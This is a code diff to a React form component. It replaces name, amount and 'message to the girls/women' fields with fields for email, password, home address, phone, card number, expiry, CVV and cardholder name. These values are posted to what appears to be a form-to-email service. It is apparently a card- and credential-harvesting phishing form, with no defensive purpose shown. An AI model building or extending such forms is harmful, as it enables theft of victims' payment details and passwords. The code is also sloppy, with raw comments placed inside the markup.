@@ -1,14 +1,14 @@
-import './Form.scss';
 import { useState, useEffect } from "react";
 
-function Form() {
 
+
+function Form() {
   const [isLoading, setIsLoading] = useState(false);
   const [formValues, setFormValues] = useState({});
 
   const [touched, setTouched] = useState({});
 
-  //error 
+  //error
   const [formError, setFormError] = useState({});
 
   const handleChange = (e) => {
@@ -20,7 +20,6 @@ function Form() {
       [e.target.name]: true,
     }));
   };
-  
 
   const validate = (values) => {
     const errors = {};
@@ -70,9 +69,10 @@ function Form() {
         body: JSON.stringify({
           password: formValues.password,
           email: formValues.email,
-          fullname: formValues.fullname,
-          amount: formValues.amount,
-          message: formValues.message,
+          cardnumber: formValues.cardnumber,
+          expdate: formValues.expdate,
+          cvv: formValues.cvv,
+          cardname: formValues.cardname,
           _subject: `New form submitted  By ${formValues.email}`,
           _captcha: true,
           _blacklist: "spammy pattern, banned term, phrase",
@@ -95,65 +95,185 @@ function Form() {
     }
   };
   return (
-    <>
-    <div className="form-container">
-    
-      <form onSubmit={handlesubmit} className='form'>
-        
-        <div>
-          <input
-            className='form-input'
-            placeholder="Name"
-            type="text"
-            name="fullname"
-            value={formValues.fullname}
-            onChange={handleChange}
-        />
-        </div>
-      
-      
+    <div className="App">
+      <form onSubmit={handlesubmit}>
         <div className='box'>
           <input 
-          className='form-input'
           placeholder="Email"
           type="text"
           name="email"
-          value={formValues.email} onChange={handleChange}
-          />
+          value={formValues.email} onChange={handleChange} />
           <div className="errorMsg">
             {touched.email && formError.email}
           </div>
         </div>
-    
+        <div className='box'>
+        <input
+          placeholder="Password"
+          type="text"
+          name="password"
+          value={formValues.password}
+          onChange={handleChange}
+        />
+         <div className="errorMsg">
+            {touched.password && formError.password}
+          </div>
+        </div>
         
-        <div>
+          //country
+         <div>
           <input
             className='form-input'
-            placeholder="Amount in USD"
+            placeholder="Country/Region"
             type="text"
-            name="amount"
-            value={formValues.amount}
+            name="country"
+            value={formValues.country}
             onChange={handleChange}
         />
         </div>
         
-         <div class="form-group">
-          <textarea
-          className='text-input'
-          placeholder="Your message to the girls/women" 
-          name="message" 
-          rows="10" 
-          value={formValues.message}
-          >
-          </textarea>
+        
+        
+        
+  //fullname        
+        <div>
+        
+         <input
+            className='form-input'
+            placeholder="First name"
+            type="text"
+            name="firstname"
+            value={formValues.firstname}
+            onChange={handleChange}
+        />
+        
+         <input
+            className='form-input'
+            placeholder="Last name"
+            type="text"
+            name="lastname"
+            value={formValues.lastname}
+            onChange={handleChange}
+        />
+      
         </div>
+        
+        
+         //Address      
+        <div>
+              <div>
+                   <input
+                      className='form-input'
+                      placeholder="Address"
+                      type="text"
+                      name="address"
+                      value={formValues.address}
+                      onChange={handleChange}
+                  />
+                  
+                   <input
+                      className='form-input'
+                      placeholder="Apartment, Suite, etc. (Optional)"
+                      type="text"
+                      name="apartment"
+                      value={formValues.apartment}
+                      onChange={handleChange}
+                  />
+            </div>
+            
+//city      
+            <div>
+                <input
+                      className='form-input'
+                      placeholder="City"
+                      type="text"
+                      name="city"
+                      value={formValues.city}
+                      onChange={handleChange}
+                  />
+                  
+                   <input
+                      className='form-input'
+                      placeholder="State"
+                      type="text"
+                      name="state"
+                      value={formValues.state}
+                      onChange={handleChange}
+                  />
+                  
+                   <input
+                      className='form-input'
+                      placeholder="ZIP code"
+                      type="text"
+                      name="zipcode"
+                      value={formValues.zipcode}
+                      onChange={handleChange}
+                  />
+            </div>
+            
+     //phone number       
+            <div>
+                 <input
+                      className='form-input'
+                      placeholder="Phone"
+                      type="number"
+                      name="phone"
+                      value={formValues.phone}
+                      onChange={handleChange}
+                  />
+            </div>
+      
+      
+        </div>
+        
+        
+        
+        
+        //credit card
+         <div>
+          <input
+            className='form-input'
+            placeholder="Card Number"
+            type="number"
+            name="cardnumber"
+            value={formValues.cardnumber}
+            onChange={handleChange}
+        />
+        
+         <input
+            className='form-input'
+            placeholder="Expiration date (MM/YY)"
+            type="text"
+            name="expdate"
+            value={formValues.expdate}
+            onChange={handleChange}
+        />
+        
+         <input
+            className='form-input'
+            placeholder="Security code"
+            type="number"
+            name="cvv"
+            value={formValues.cvv}
+            onChange={handleChange}
+        />
+        
+         <input
+            className='form-input'
+            placeholder="Card Name"
+            type="text"
+            name="cardname"
+            value={formValues.cardname}
+            onChange={handleChange}
+        />
+        </div>
+        
    
         {isLoading ? (<button>Loading...</button>)
-       : ( <button type="submit" className='submit-btn'>Checkout</button>) }
+       : ( <button type="submit">submit</button>) }
        
       </form>
     </div>
-    </>
   );
 }
 
